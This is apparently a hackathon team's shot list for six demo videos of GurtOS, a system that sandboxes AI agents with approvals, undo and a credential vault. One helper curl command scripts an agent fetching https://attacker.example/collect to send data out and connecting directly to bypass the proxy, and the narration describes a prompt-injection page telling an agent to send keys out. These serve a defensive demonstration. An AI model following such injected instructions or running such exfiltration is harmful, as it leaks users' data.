# Videos: shot lists

Six videos, all recorded by Ben, all uploaded to YouTube as **Unlisted** (Devpost's video field takes YouTube or
Vimeo). After uploading, put each video's id (the part after `watch?v=`) into `showcase/src/data/videos.ts`, then
rebuild and redeploy the showcase (`showcase/README.md`). Until an id is set, each showcase page shows a silent
screen recording of the real app instead.

| Video | Length | Key in `videos.ts` | Shown on |
|---|---|---|---|
| Main | 2 to 3 min | `main` | Devpost's video field, the overview, Anthropic, Factory, Armadin, Spacetime and others |
| Fetch.ai | 3 to 5 min, inside ASI:One | `fetch` | Fetch.ai page; also submit it to the ASI:One Submission Agent |
| Atlassian | 3 min or less | `atlassian` | Atlassian page |
| Figma | 3 min or less | `figma` | Figma page |
| Hyphenate | opens with its moment; aim for 3 min | `hyphenate` | Hyphenate, Microsoft, CRS and Nessie pages |
| Visa | aim for 2 to 3 min | `visa` | Visa page |

## Before any recording

- **Which box.** Record the four moments on the demo box you will bring on Sunday (the laptop VM), so the video
  matches the table. The Jira, Mana and Elastic parts use the always-on boxes, which already hold the real history.
- **Clean screen.** Use a browser profile with no bookmarks bar, no extensions and no other tabs. Hide the menu bar
  clock if it shows a personal calendar. Close chat apps and notifications (Do Not Disturb on the Mac and the phone).
- **Never on screen:** a terminal showing your home path or machine name, the vault file, `~/.config`, any `.env`,
  a Tailscale address, an email inbox, the Vultr console. If you need a terminal, use a fresh window titled `box`
  with a plain prompt (`PS1='$ '`).
- **Phone.** Pair it from the box screen's Settings first, so the log names it. Record the phone with QuickTime
  (USB, File, New Movie Recording, pick the iPhone) or iOS screen recording.
- **Money on screen** must say TEST. The shopper and wallet already label it; say "test money" out loud once.
- **Sound.** One take of narration per video, recorded after the screen capture, is easier than talking live.
- **Resolution.** Record at 1920 x 1080. Export H.264, 30 fps.

## Helpers for triggering each moment

The throwaway box the showcase used for its clips, `showcase/scripts/clips/clip-box.sh`, fires each moment on cue
with scripted tasks and test money. On the demo box itself, the same tasks are one `curl` each against the box's
API (from a terminal on the box, or through the portal's "New task"):

```sh
# Moment 3: a task asks to spend over its budget (test spend, moves no money)
curl -s localhost:7700/api/tasks -H 'content-type: application/json' -d '{"title":"Buy a GPU hour","worker":"fake","tools":["example.spend"],"budgetCents":500,"prompt":"call example.spend {\"cents\":800,\"on\":\"a GPU hour\"}\nwrite gpu.txt booked"}'

# Moment 2: a scripted agent reads a page, then tries to send data out and to go around the proxy
curl -s localhost:7700/api/tasks -H 'content-type: application/json' -d '{"title":"Find me a road bike","worker":"fake","hosts":["example.com"],"prompt":"fetch http://example.com/ page.html\nsleep 4\nfetch https://attacker.example/collect exfil.txt\nconnect 1.1.1.1:443 direct.txt\nwrite bikes.md Two road bikes under 600 dollars."}'

# Moment 1: two tasks change the same workspace; undo one of them in the portal
curl -s localhost:7700/api/tasks -H 'content-type: application/json' -d '{"title":"Write the weekly notes","worker":"fake","workspace":"notes","prompt":"write notes.md # Notes\nappend notes.md Groceries came in under budget."}'
curl -s localhost:7700/api/tasks -H 'content-type: application/json' -d '{"title":"Rename the photo folders","worker":"fake","workspace":"notes","prompt":"write photos.txt renamed 212 folders"}'

# Moment 4: a long task, then pull the plug (on the laptop VM: limactl stop -f box, then limactl start box)
curl -s localhost:7700/api/tasks -H 'content-type: application/json' -d '{"title":"Long job","worker":"fake","prompt":"append progress.txt 1\nsleep 3\nappend progress.txt 2\nsleep 900\nappend progress.txt 3"}'
```

For a real agent instead of a scripted one, drop `"worker":"fake"` (Droid with Claude) and write the prompt in plain
words. Scripted tasks are fine for the moments; say once that the agent in moments 2 and 4 is scripted so it does the
same thing every take, and that the Droid version is in the merge gate.

---

## 1. Main video (2 to 3 minutes)

Goal: a judge who watches only this understands what GurtOS is, sees all four moments working, and knows it is an
OS, not a dashboard.

| Time | On screen | Say (roughly) |
|---|---|---|
| 0:00 | Deck slide 2 (392,891 stars), then slide 3 (21,639 exposed, 341 malicious skills, 1 click) | "Almost four hundred thousand people starred an agent that runs on your own computer. Then twenty thousand of them were reachable from the internet, a tenth of its skills were malware, and one click could steal its token." |
| 0:15 | Deck slide 4 ("I already do this by hand") | "I run agents unattended at home too. Every one runs as me, with my keys and my files. I can't undo one job, nothing asks before it spends, and after a power cut I check by hand." |
| 0:30 | The box screen, full screen: wallpaper, widgets, app grid, dock. Slow push in on the GurtOS name | "So I built GurtOS: an operating system where agents get real access, and never your keys. Every task is its own Linux user, in its own copy of your files." |
| 0:40 | **Moment 3.** Split screen: box screen left, phone right. Fire the GPU-hour task. The banner lands on both at once | "A task wants to spend eight dollars on a five-dollar budget. It stops and asks. The request is on the box and on my phone at the same moment, and the other tasks keep running." |
| 0:55 | Tap Approve on the phone. The box banner disappears, the task finishes | "I approve from the phone. The first answer wins, and the log records which phone said yes." |
| 1:05 | **Moment 2.** Fire the road-bike task. The red Blocked banner arrives. Open the task: red summary, red log rows | "This agent reads a web page with hidden instructions: send your keys to attacker dot example. There are no keys in the task to send. The vault is root only, and the task can only reach example dot com. The box blocks it and writes it down." |
| 1:25 | Press Undo on the banner | "And undo throws away everything it wrote." |
| 1:30 | **Moment 1.** Time Machine: two task layers on the notes workspace. Select one, show "what comes back" and "what stays". Undo, confirm | "Every task is a layer. Undo takes out one task's changes. The other task's work stays. No git, no backups." |
| 1:50 | **Moment 4.** A long task running. Cut to the laptop: force-stop the VM. Black screen. Start it. The boot screen, then "Welcome back" with the resumed list | "Now pull the plug. The box boots, rebuilds every task from its append-only log, and picks up where it stopped. Nothing ran twice, and the approval is still waiting." |
| 2:15 | Fast montage, 3 s each: the bootable ISO installing in a VM; GurtOS Personal on GNOME (a notification, Ask an Agent in Files, Keep or Undo); a Jira issue with Roll back; the ASI:One chat with an Approve card; the credit desk score 14 of 14 | "It's a real OS: a bootable image with updates that roll back by themselves, a Personal edition on your own laptop, and apps that plug into Jira, ASI:One and a finance desk that caught fourteen of fourteen planted errors." |
| 2:35 | The merge gate's last line: `demo: 22 passed, 0 failed`, then the showcase URL | "Every one of these runs in the merge gate on every change. GurtOS: real access, never your keys. Everything is at calhacks dot gurtos dot com." |

Cut list if long: drop the montage's credit desk shot first, then the ISO shot.

## 2. Fetch.ai (3 to 5 minutes, inside ASI:One)

Fetch.ai wants the main flow inside an ASI:One chat. Keep the portal off screen except one shot.

| Time | On screen | Say |
|---|---|---|
| 0:00 | The `box` agent's Agentverse profile: name, address, the innovationlab and hackathon badges, Agent Chat Protocol | "This is my box on Agentverse: an always-on computer where AI agents work safely. It speaks the Agent Chat Protocol, so ASI:One can find it and give it work." |
| 0:20 | ASI:One. Search "box" (or paste the address `agent1qvuk46tnt9lnscher0pawl7pr5y525mak66ptwsrvg4kff0pfy9m2sy0us6`), open a chat | "I find it in ASI:One and open a chat." |
| 0:35 | Send "hi". The reply asks to pair. Cut to the box screen's ASI:One app with the six-digit code, back to the chat: `pair <code>`. "Paired." | "Only the owner can give it work. I pair once with the code on the box's screen. Anyone else only ever gets the pairing step." |
| 1:00 | "Fix the failing test in my project." Progress replies arrive | "Now real work. The box starts a task: Droid, Factory's coding agent running Claude, in its own Linux user, with its own copy of the project, no network and a 25 cent budget." |
| 1:40 | The result: summary, changed files, the diff, and the card with Keep and Undo | "It found the cent the bill-splitter was losing, fixed it and ran the tests. The diff is right here, with Keep and Undo." |
| 2:00 | "Check if the Hario V60 paper filters, size 02, 100 count, are back in stock." | "Something that costs money: a web search through Apify." |
| 2:20 | The Interactive Card: "Paused for your OK: Spend $0.50 on apify.run? Budget $0.25" with Approve and Deny | "A search costs more than the budget, so the task stops and asks, with an ASI Interactive Card." |
| 2:35 | One shot: the same request on the box screen or the phone | "The same request is on my phone and the box. The first answer wins." |
| 2:45 | Approve in the chat. The answer: in stock on Hario's US store at the price it found | "I approve in the chat, and it answers from the live web." |
| 3:10 | Type "status", then "undo" | "Status lists my tasks and their cost. Undo takes back the last one, and only that one." |
| 3:30 | Diagram: ASI:One, Agentverse mailbox, agent.py on the box, the box's API, the task (the showcase's Fetch.ai page has it) | "The agent runs on the box as an unprivileged user, through an Agentverse mailbox, so the box needs no open port. It uses the same API as my phone, so the chat has no powers the phone doesn't. Tasks never hold keys." |
| 4:00 | The README's agent table and the repo link | "Agent names, addresses and run steps are in the repo." |

After recording: share the chat link, and submit the project through the **ASI:One Submission Agent** as Fetch.ai
asks.

## 3. Atlassian (3 minutes or less)

Shoot in Jira on the demo site, signed in. Use BOX-2 for the roll back and BOX-5 for
the approval, or run `DEMO_LIVE=jira ./demo` just before to make fresh issues (it deletes them at the end, so pause it
or make new ones by hand).

| Time | On screen | Say |
|---|---|---|
| 0:00 | Title card: "An agent ran overnight with write access. What did it do, and how do you undo only the wrong part?" | Read it. |
| 0:15 | The BOX board: issues in To Do, In Progress, In Review, Done | "Every task an agent runs on my box is an issue here, and it moves across the board as it runs." |
| 0:35 | BOX-2's description: the prompt, what it was allowed, the blocked attempt to reach a paste site, the diff touching three configs | "This one was told to change one retry rule. It changed three services, and it tried to send the repo to a paste site, which the box blocked." |
| 1:05 | The Box agent task panel: waiting for an OK, the blocked attempt, the audit trail | "The panel is a Forge app. It shows the task live from the box." |
| 1:20 | Press Roll back this task, confirm, "Rolled back" and the comment naming who did it | "Roll back removes only this task's changes on the box." |
| 1:45 | The box's files (portal Time Machine or the task window): the three configs are back, the README fix from BOX-1 is still there | "The other task's fix stays." |
| 2:05 | BOX-5: a Droid task asking to spend $3.00 of test money; Approve in the panel; the audit trail says "Approved by jira" | "Approvals work from Jira too." |
| 2:25 | JQL: `project = BOX AND boxBlocked > 0` | "And the morning-after question is one search, on fields the Forge app indexes." |
| 2:40 | The diagram from the showcase's Atlassian page | "The resolver runs in Atlassian's cloud, checks you may edit the issue, and is the only place that holds the box's secret." |

## 4. Figma (3 minutes or less)

The stage log is the spine. Put each stage's tool, minutes and rating on screen as a lower third.

| Time | On screen | Say |
|---|---|---|
| 0:00 | The real box screen, then the Figma design of the same screen, side by side | "This is GurtOS's screen, running. Every pixel started in Figma." |
| 0:15 | **Ideation.** The FigJam board: architecture, the four moments, the 25 tracks; zoom to the moodboard of 15 OS references | "FigJam, built through Figma's MCP server: the architecture, the four moments, and a moodboard when the first screens looked like a dashboard." |
| 0:40 | The three directions page (home-server OS, console, hardware OS) | "Three OS directions. I picked the home-server OS." |
| 0:55 | **Design.** The Design system page: variables in Paper and the desktop, text styles, components | "Every color and size is a variable with a CSS name, so code uses the same names." |
| 1:15 | **Prototyping.** Play the phone flow (the approval drops in, Approve, running again) and the undo flow; then the Figma Make file | "Two flows wired between the real screens, and the same flows in Figma Make." |
| 1:40 | **Handoff and code generation.** `get_design_context` on the box home in Claude Code, then the portal's Preact code with the same token names, then the running portal | "The portal thread read the screens through the MCP server and built the real app: one web app for the box's screen, a laptop and a phone." |
| 2:15 | The Personal (GNOME) frames next to the real GNOME screenshots | "The Personal edition, designed against GNOME's guidelines, built in GTK." |
| 2:35 | Figma Slides, the deck | "And the pitch deck is Figma Slides, with the real screens." |
| 2:50 | The stage log table | "The stage log has the minutes and ratings for each step." |

Before recording: share every file with "Anyone with the link can view" (steps in `docs/figma.md`, "Sharing"), and
publish the Make file so it can be embedded.

## 5. Hyphenate (opens with its moment; aim for 3 minutes)

Hyphenate asks for a video that **opens with the moment**. No intro before it. Then the problem, then why an OS.
Say out loud, once each, which parts come from GurtOS and which from the desk (the "From" column of the table on
the showcase's Hyphenate page).

| Time | On screen | Say |
|---|---|---|
| 0:00 | The Credit desk window, Quick run. APP-1043, Pacific Crest Provisions: the simple rule column says approve $20,000 | "A new customer asks for twenty thousand dollars of credit. A simple rule says yes." |
| 0:10 | The row turns amber: CRS identity fails (2201, 2202), Fraud Finder 88 | "The credit analyst, an AI agent, ran seven CRS checks. The owner is a synthetic identity." |
| 0:20 | The phone: the fraud hold waiting. Tap Approve. The row records "controller (phone)" | "It can't decide this alone. It asks the controller, on my phone. An $18,500 rush order never ships." |
| 0:35 | Title card: "Companies want AI employees. Today's computers weren't built for them." | "Companies want AI employees. But an agent today runs as you, with your keys, on one shared disk. No separation of duties, no record you can trust, no undo. So nobody lets it do real finance work." |
| 0:55 | Tasks window: two seats running side by side, each "runs as box-..." | "GurtOS is an environment for AI employees. Each seat is its own Linux user with its own copy of the files. That's the OS, not the app." |
| 1:10 | A seat's task window: "What it was allowed", tools only, no hosts; the log line showing CRS ran in the core | "No seat ever sees a password. The CRS and bank keys stay in the vault; the OS makes the call for it." |
| 1:25 | A tool refusing: the clerk can't release a credit hold; the analyst can't approve $40,000 alone | "The desk decides who may do what. The OS makes them stop and ask." |
| 1:40 | The case files and the answer key's 14 planted errors | "The data is messy on purpose: fourteen planted errors and seven traps that look wrong but aren't." |
| 1:55 | Nessie deposits against the ledger: PMT-8812 applied to the wrong invoice | "The collections clerk reconciles the ledger against the bank, Capital One's Nessie." |
| 2:10 | One decision in the log: rule ids, the 7 CRS request ids, who approved | "Every decision carries its rules, its data and who approved it, in an append-only log from the OS." |
| 2:25 | Score: 14 of 14, 0 false alarms, 6 of 6 decisions (live Droid run 73c47b) | "A full live run with Claude: fourteen of fourteen, no false alarms." |
| 2:40 | The case menu in the Credit desk window | "Bring your own case: drop a folder on the box and run it." |
| 2:50 | If GurtOS Business has merged: Waiting for me, the routed approval, Audit and its CSV, the kill switch. If not, skip this shot | "In GurtOS Business, approvals route to the right person by role, and the whole company sees the audit trail." |

Swap the opening for "a March decision reopened in June" only if the credit desk's reopening work has merged by
the time you record.

## 6. Visa (aim for 2 to 3 minutes)

Say "test payment" out loud at least once. Open with the problem (agents need your card, stores can't tell them from
bots, you can't see or stop them), then show GurtOS on a computer you own. Visa's criteria are innovation (25), user
experience (25), technical execution (20), commerce impact (15) and trust (15); the last column says which shot serves
which. If the Visa thread's Face ID approval, mandates or merchant dashboard have merged, swap them in where marked.

| Time | On screen | Say |
|---|---|---|
| 0:00 | Title card: "Shopping agents need your card. Stores can't tell them from bots. You can't see what they do." | "Today a shopping agent needs your card or your password, stores can't tell it from a bot, and you can't watch it. GurtOS runs it on a computer you own." |
| 0:10 | The Shopper app. Type "Get me the Hario V60 02 filters when they're under $7, two packs" | "Shopping as a standing instruction. I say it once." |
| 0:15 | The watch appears at the GurtOS Test Store: $8.99 now, $7.00 limit. Beside it, a live Best Buy watch on Chemex filters with the price Apify read | "Claude turns it into a watch. The box checks on a schedule, and for real stores it reads live prices through Apify, here Best Buy." |
| 0:35 | The GurtOS Test Store's demo controls: drop the Hario filters to $6.50 | "When the price drops under my limit..." |
| 0:45 | The phone: "Buy 2 × Hario V60 02 paper filters for $13.00? TEST PAYMENT", Approve (Face ID here once passkey approval has merged) | "...my phone asks once. I tap Approve." (UX, trust) |
| 1:00 | The store's order page: TAP signature verified, Stripe test mode charge with the Visa test card | "The box signs the order with Visa's Trusted Agent Protocol, and the store checks it before charging. This is a test payment." (commerce impact, technical; the merchant dashboard goes here once merged) |
| 1:20 | The store refusing: unsigned order, changed order, replayed signature | "An agent without the box's key can't buy. A changed order fails. A replayed signature fails." (trust) |
| 1:40 | Undo the purchase task: refunded | "Undo is a refund." (UX) |
| 1:50 | Household reorder: receipts read, "filters and paper towels run out this week", one proposal, Approve | "It also reads the household's receipts and proposes one reorder, without ever seeing the mailbox login." |
| 2:15 | The agent never holds the card: the log has no card, key or password | "The model never holds the card or a buy tool. Every purchase needs my tap and stays inside its budget." |

## After uploading

1. YouTube: Unlisted, title "GurtOS: <video name>", description with https://calhacks.gurtos.com.
2. Put the ids into `showcase/src/data/videos.ts`.
3. Rebuild and redeploy the showcase (`showcase/README.md`).
4. Paste the main video's link into Devpost's video field.
